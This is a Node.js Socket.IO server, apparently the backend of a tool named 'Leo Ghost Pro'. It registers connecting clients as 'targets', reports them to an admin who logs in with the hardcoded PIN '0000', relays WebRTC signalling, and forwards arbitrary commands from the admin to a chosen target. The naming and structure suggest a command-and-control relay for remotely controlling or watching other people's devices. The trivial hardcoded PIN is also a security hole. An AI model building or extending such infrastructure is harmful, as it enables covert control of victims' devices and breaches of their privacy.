const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let adminSocketId = null;

io.on('connection', (socket) => {
    console.log('User Joined:', socket.id);

    socket.on('admin-join', (pin) => {
        if (pin === "0000") {
            adminSocketId = socket.id;
            socket.emit('admin-status', { success: true });
            updateTargetList();
        } else {
            socket.emit('admin-status', { success: false });
        }
    });

    socket.on('target-join', () => {
        socket.join('targets_room');
        updateTargetList();
    });

    socket.on('signal', (data) => {
        io.to(data.to).emit('signal', { from: socket.id, signal: data.signal });
    });

    socket.on('command', (data) => {
        io.to(data.targetId).emit('command', { cmd: data.cmd, adminId: socket.id });
    });

    socket.on('disconnect', () => {
        if (socket.id === adminSocketId) adminSocketId = null;
        updateTargetList();
    });
});
function updateTargetList() {
    if (adminSocketId) {
        const targets = io.sockets.adapter.rooms.get('targets_room');
        const list = targets ? Array.from(targets) : [];
        io.to(adminSocketId).emit('update-targets', list);
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Leo Ghost Pro running on ${PORT}`));
